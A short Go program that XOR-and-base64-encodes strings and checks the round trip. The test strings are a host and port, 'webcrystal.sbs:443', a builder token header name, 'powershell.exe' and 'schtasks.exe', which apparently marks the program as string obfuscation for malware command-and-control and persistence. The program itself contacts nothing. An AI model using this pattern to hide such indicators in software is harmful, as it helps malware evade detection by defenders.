package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func escapeGoString(s string) string {
	if s == "" {
		return ""
	}
	replacer := strings.NewReplacer(
		"\\", "\\\\",
		"\"", "\\\"",
		"\r", "\\r",
		"\n", "\\n",
	)
	return replacer.Replace(s)
}

func xorWithKey(s, key string) string {
	if s == "" || key == "" {
		return ""
	}
	out := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		out[i] = s[i] ^ key[i%len(key)]
	}
	return escapeGoString(base64.StdEncoding.EncodeToString(out))
}

func xorDecode(input string, key []byte) []byte {
	raw, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		fmt.Println("DECODE ERROR:", err)
		return nil
	}
	out := make([]byte, len(raw))
	for i := 0; i < len(raw); i++ {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return out
}

func main() {
	key := "TestKey12345678901234567890ABCDEF"
	for _, s := range []string{"webcrystal.sbs:443", "X-Builder-Token", "powershell.exe", "schtasks.exe"} {
		enc := xorWithKey(s, key)
		dec := xorDecode(enc, []byte(key))
		fmt.Printf("IN=%s ENC=%s DEC=%s OK=%v\n", s, enc, string(dec), string(dec) == s)
	}
}
